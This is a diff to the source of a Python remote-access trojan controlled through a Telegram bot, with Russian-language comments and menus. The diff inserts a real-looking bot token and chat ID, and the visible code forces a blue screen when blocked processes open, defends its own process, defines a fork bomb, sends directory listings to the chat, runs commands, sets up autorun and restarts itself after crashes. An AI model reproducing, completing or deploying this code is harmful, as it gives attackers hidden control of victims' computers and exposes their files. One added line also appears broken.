@@ -31,8 +31,8 @@ from os import system
 
 
 #Токен/Айди
-TelegramToken = 'TOKEN'
-TelegramChatID = 'ID'
+TelegramToken = '1187706817:AAEvWdVXLskdp5Ys35yU_KJx7j8erhb2BVI'
+TelegramChatID = '643200553'
 
 #Прокси
 Proxy = False
@@ -173,9 +173,9 @@ main8.row(button6, button7, button8)
 # Variables
 
 ProgramFiles = os.environ['ProgramW6432']+'\\'
-ProgramFiles86 = os.environ["ProgramFiles(x86)"]+'\\'
-ProgramData = os.environ["ProgramData"]+'\\'
-Temp = os.environ["TEMP"]+'\\'
+ProgramFiles86 = os.environ['ProgramFiles(x86)']+'\\'
+ProgramData = os.environ['ProgramData']+'\\'
+Temp = os.environ['TEMP']+'\\'
 
 Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
 CurrentName = os.path.basename(sys.argv[0])
@@ -309,7 +309,10 @@ if ProcessBSODProtectionEnabled is True:
   SetProtection()
 
 if ProcessBSODProtectionEnabled is True:
+ Argument = none.stop = True
  AdminChecker()
+else:
+ Argument = ''
 
 
 # BSoD if a forbidden process is open
@@ -463,16 +466,16 @@ def WindowTitle():
 
 # Displays a message on the screen
 
-def MessageBox(Message):
+def SendMessageBox(Message):
  ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x40)
 
 
 # Opens a browser link
 
 def OpenBrowser(URL):
- if not URL.startswith("http"):
-     URL = "http://" + URL
- return system(f"@start {URL} > NUL")
+ if not URL.startswith('http'):
+     URL = 'http://' + URL
+ return system(f'@start {URL} > NUL')
 
 
 # Receive a photo from a Telegram Chat
@@ -495,7 +498,7 @@ def SetWallpapers(Photo):
 
 def SpeakText(Text):
  from win32com.client import constants, Dispatch
- speaker = Dispatch("SAPI.SpVoice")
+ speaker = Dispatch('SAPI.SpVoice')
  speaker.Speak(Text)
  del speaker
 
@@ -515,7 +518,7 @@ def ForkBomb():
 # Sets text to clipboard
 
 def SetClipboard(Text):
- pyperclip.copy(text)
+ pyperclip.copy(Text)
 
 
 # Get text from clipboard
@@ -661,7 +664,6 @@ if MakeBSODWhenProcessStarted is True:
   try:
    if CheckProcess() is True:
     BSoD()
-    print('[+] › Найден заблокированный процесс!')
   except:
    pass
 
@@ -845,11 +847,11 @@ def CD(command):
 def ls(command):
  try:
   bot.send_chat_action(command.chat.id, 'typing')
-  dirs = '\n``'.join(os.listdir(path="."))
+  dirs = '\n``'.join(os.listdir())
   bot.send_message(command.chat.id, '`'+os.getcwd() + '`\n\n'+'`' + dirs+'`', parse_mode="Markdown")
  except:
   try:
-   dirse = '\n'.join(os.listdir(path="."))
+   dirse = '\n'.join(os.listdir())
    splitted_text = util.split_string(dirse, 4096)
    for dirse in splitted_text:
      bot.send_message(command.chat.id, '`'+dirse+'`', parse_mode="Markdown")
@@ -1096,7 +1098,7 @@ def OpenURL(command):
 
 
 @bot.message_handler(content_types=['photo'])
-def wallpapers(command):
+def Wallpapers(command):
  try:
   Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
   GetPhoto(Photo, command)
@@ -1324,39 +1326,39 @@ def CMD(command):
 
 
 @bot.message_handler(commands=['3', '6'])
-def main(command):
+def Main(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")
 
 @bot.message_handler(commands=['2', '5'])
-def main(command):
+def Main(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")
 
 @bot.message_handler(commands=['4', '1'])
-def main(command):
+def Main(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Power', 'power'])
-def power(command):
+def Power(command):
  bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main2, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Autorun', 'autorun'])
-def autorun(command):
+def Autorun(command):
  bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main3, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Files', 'files'])
-def files(command):
+def Files(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Cancel'])
-def cancelfiles(command):
+def CancelFiles(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Wallpapers', 'wallpapers'])
-def wallpapers(command):
+def Wallpapers(command):
  bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['Help', 'help'])
-def help(command):
+def Help(command):
  bot.send_message(command.chat.id,
   'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
   '\n'
@@ -1395,7 +1397,7 @@ def help(command):
 
 
 try:
- bot.polling()
+ bot.polling(Argument)
 except:
  os.startfile(CurrentPath)
  sys.exit()
